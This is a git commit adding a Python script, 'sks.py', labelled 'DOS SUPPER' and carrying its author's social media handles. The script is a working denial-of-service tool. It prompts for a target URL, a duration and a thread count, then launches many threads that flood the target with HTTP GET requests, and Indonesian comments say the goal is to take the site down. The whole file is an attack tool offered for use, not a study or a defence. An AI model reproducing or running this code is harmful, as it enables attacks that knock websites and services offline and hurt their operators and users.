a36745317ddfda6bf1cb330a47a7bd91bc7e8936
AnggiX <112361916+anggianakbaik@users.noreply.github.com>
2024-01-04 17:13:41 +0700

    Add files via upload

---
+++ sks.py
@@ -0,0 +1,74 @@
+import threading
+import requests
+import time
+import os
+
+def send_requests(url, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            requests.get(url)
+        except Exception as e:
+            pass
+
+def clear_screen():
+    os.system("clear")
+
+def main():
+    clear_screen()
+    banner = """
+                         ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
+                         ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
+                         ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
+                         ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
+                         ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
+                         ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
+                         ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
+                         ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
+                         ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
+                         ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+                         ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
+                         ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
+                         ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
+                         ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣
+"""
+    print(banner)
+    print("  ")
+    print("                                  DOS SUPPER")
+    print("                             TikTok : @anggi545454")
+    print("                            INSTAGRAM : @anggi545454")
+    print("  ")
+    print("  ")
+
+    # Input Link Target ➷
+    target_url = input("Input target URL: ")
+
+    # Input durasi berapa lama down ➷
+    duration = int(input("Enter duration in seconds: "))
+
+    # Berapa Jumlah Yang Ingin Di Threads ➷
+    num_threads = int(input("Enter the number of threads: "))
+
+    # Memulai Untuk Ddos ➷
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_requests, args=(target_url, duration))
+        thread.start()
+        threads.append(thread)
+
+   
+    time.sleep(duration)
+
+    # Berhenti
+    for thread in threads:
+        thread.join()
+
+    clear_screen()
+
+    print("WAITING ATTACK URL🌐🔥\n"
+          f"Url target = {target_url}\n"
+          f"Duration = {duration} seconds\n"
+          f"Threads = {num_threads}\n")
+
+if __name__ == "__main__":
+    main()
